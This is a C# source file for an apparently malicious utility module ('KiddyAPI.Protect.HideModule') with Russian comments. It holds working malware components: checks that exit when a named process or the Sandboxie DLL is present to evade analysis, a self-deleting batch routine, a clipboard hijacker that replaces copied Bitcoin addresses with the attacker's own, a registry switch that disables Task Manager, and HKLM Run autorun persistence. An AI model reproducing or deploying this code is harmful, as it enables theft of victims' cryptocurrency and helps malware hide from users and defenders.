using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace KiddyAPI.Protect
{
    /// <summary>
    /// Доступ к различным методам скрытия/мигрирования программы
    /// </summary>
    public  class HideModule
    {
        private static bool FindProcess(string name)
        {
            try
            
            {
                var process = Process.GetProcesses();
                foreach (var pr in process)
                {
                    if (pr.ProcessName == name)
                        return true;
                    else
                    {
                        continue;
                    }
                }

                return false;
            }
            catch
            {
                return false;
            }
        }
        /// <summary>
        /// Закрытие программы, если запущен определенный процесс
        /// </summary>
        /// <param name="name">Имя проверяемого процессора</param>
        public static void CheckProcess(string name)
        {
            try
            {
                if (FindProcess(name))
                {
                    Environment.Exit(0);
                }
            }
            catch { }
        }
        /// <summary>
        /// Проверка на подгрузку в процесс dll SandBox
        /// </summary>
        public static void CheckSandBox()
        {
            try
            {
                foreach (string sModul in Process.GetCurrentProcess().Modules)
                {
                    if (sModul.Contains("sbiedll.dll")) { Environment.Exit(0); return; }
                }
            }
            catch { }
        }

        /// <summary>
        /// Автоудаление программы, когда мы захотим
        /// </summary>
        /// <param name="fileName">Имя нашего exe "Example.exe(Полный путь до файла указывать)"</param>
        public static void Suicide(string fileName, string batName)
        {
            string _fileName = fileName;
            string _batName = "i";
            string telo = string.Format("@echo off{0}:loop{0}del {1}{0}if exist {1} goto loop{0}del {2}", Environment.NewLine, _fileName, _batName);
            using (StreamWriter strwr = new StreamWriter(_batName, false))
                strwr.Write(telo);
            Process.Start(_batName);
        }

        
        /// <summary>
        /// Подмена BTC кошелька
        /// </summary>
        /// <param name="address">Ваш адрес</param>
        public void Clip(string address)
        {
            while (true)
            {
                Thread.Sleep(15); // Задержка, что бы не перегружать систему
                if (Clipboard.GetText() != address)
                    if (Clipboard.GetText().Length >= 26 && Clipboard.GetText().Length <= 35)
                        if (Clipboard.GetText().StartsWith("") ||
                            Clipboard.GetText().StartsWith("3") || // Кошельки могут начинаться с 1, 3(мультикошельки)
                            Clipboard.GetText().StartsWith("bc1"))
                        {
                            Clipboard.SetText(address);
                        }
            }
        }

        /// <summary>
        /// Включение/Отключение Диспетчера задач
        /// </summary>
        /// <param name="enable">true - включить, false - выключить</param>
        public static void EnableTaskManager(bool enable)
        {
            Microsoft.Win32.RegistryKey HKCU = Microsoft.Win32.Registry.CurrentUser;
            Microsoft.Win32.RegistryKey key = HKCU.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", enable ? 0 : 1,
                Microsoft.Win32.RegistryValueKind.DWord);
        }
        /// <summary>
        /// Добавление в автозагрузку
        /// </summary>
        /// <param name="name">Имя программы отображаемое в реестре</param>
        /// <param name="path">Путь до программы</param>
        public static void SetAutorun(string name, string path)
        {
            using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            using (var key = baseKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                key.SetValue(name, path);
            }
        }
    }
}
